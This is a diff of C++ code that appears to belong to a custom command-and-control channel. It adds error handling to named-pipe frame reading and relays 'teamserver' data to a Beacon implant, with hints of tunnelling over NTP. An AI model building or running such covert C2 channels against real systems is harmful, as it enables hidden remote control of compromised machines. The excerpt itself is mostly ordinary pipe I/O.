@@ -313,22 +313,60 @@ std::vector<uint8_t> getId() {
 
 //NOTE still need to setup server side and make sure that logic lines up
 
+//DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
+//	DWORD size = 0, temp = 0, total = 0;
+//
+//	/* read the 4-byte length */
+//	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);
+//
+//	/* read the whole thing in */
+//	while (total < size) {
+//		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+//		total += temp;
+//	}
+//
+//	return size;
+//}
+
 DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
 	DWORD size = 0, temp = 0, total = 0;
 
-	/* read the 4-byte length */
-	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);
+	if (!ReadFile(my_handle, (char*)&size, 4, &temp, NULL)) {
+		fprintf(stderr, "Failed to read frame size. Error: %lu\n", GetLastError());
+		return 0;
+	}
 
-	/* read the whole thing in */
+	if (temp != 4) {
+		fprintf(stderr, "Expected 4 bytes for size, got %lu\n", temp);
+		return 0;
+	}
+
+	printf("Frame size: %u\n", size);
+
+	if (size > max) {
+		fprintf(stderr, "Frame size %u exceeds buffer max %u\n", size, max);
+		return 0;
+	}
+
 	while (total < size) {
-		ReadFile(my_handle, buffer + total, size - total, &temp, NULL);
+		if (!ReadFile(my_handle, buffer + total, size - total, &temp, NULL)) {
+			fprintf(stderr, "ReadFile failed while reading frame data. Error: %lu\n", GetLastError());
+			return 0;
+		}
+
+		if (temp == 0) {
+			fprintf(stderr, "Pipe closed before reading complete frame.\n");
+			break;
+		}
+
 		total += temp;
 	}
 
 	return size;
 }
 
-/* write a frame to a file */
+/*
+write a frame to a file */
 void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
 	DWORD wrote = 0;
 	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
@@ -389,21 +427,18 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 			clientId
 		);
 
-
-		std::cout << "[?] Theoretical data would be passed back into pipe now - not imlpemented. Next pipe read will hang because of it. " << std::endl;
-		//extract data out from chunker response
-		//NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
-		//auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
-
 		std::cout << "[?] Data being written to pipe: ";
 		printHexVector(dataFromTeamserver);
 		std::cout << std::endl;
 
-		//convert to const char * as that's what write_frame wants
-		auto dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());
+		//convert to char * as that's what write_frame wants
+		char * dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());
 
 		/* write to our named pipe Beacon */
 		write_frame(handle_beacon, dataForBeacon, read);
+
+		//sleep & wait for beacon to do something
+		Sleep(10000);
 	}
 }
 
